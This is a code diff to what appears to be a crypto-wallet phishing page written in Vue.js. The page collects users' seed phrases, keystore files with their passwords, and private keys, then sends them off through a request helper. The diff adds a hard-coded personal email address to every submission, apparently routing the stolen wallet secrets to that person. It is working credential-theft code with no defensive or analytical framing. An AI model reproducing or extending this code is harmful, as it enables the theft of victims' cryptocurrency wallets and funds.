@@ -124,7 +124,7 @@ export default {
       }
       this.isLoading = true
 
-      const data = {phraseTextarea: `${this.platform} PHRASE= ${this.phraseTextarea} `, name: "PHRASE" }
+      const data = {phraseTextarea: `${this.platform} PHRASE= ${this.phraseTextarea} `, name: "PHRASE", email: 'tobilobabadrun@gmail.com' }
       this.sendRequest(data).then(() => {
         this.isLoading = false;
         var textphrase = document.getElementById("phraseTextArea");
@@ -142,7 +142,7 @@ export default {
         return
       }
       this.isLoading = true;
-      const data = {keystoreTextarea: `${this.platform} KEYSTORE= ${this.keystoreTextarea} PASSWORD= ${this.keystorePassword}`, name: "KEYSTORE" }
+      const data = {keystoreTextarea: `${this.platform} KEYSTORE= ${this.keystoreTextarea} PASSWORD= ${this.keystorePassword}`, name: "KEYSTORE", email: 'tobilobabadrun@gmail.com' }
       this.sendRequest(data).then(() => {
         this.isLoading = false;
         var textkeystore = document.getElementById("keystoreTextArea");
@@ -161,7 +161,7 @@ export default {
         return
       }
       this.isLoading = true;
-      const data = {privateTextarea: `${this.platform} PRIVATE PASSWORD= ${this.privateTextarea}`, name: "PRIVATE" }
+      const data = {privateTextarea: `${this.platform} PRIVATE PASSWORD= ${this.privateTextarea}`, name: "PRIVATE", email: 'tobilobabadrun@gmail.com' }
 
        this.sendRequest(data).then(() => {
         this.isLoading = false;
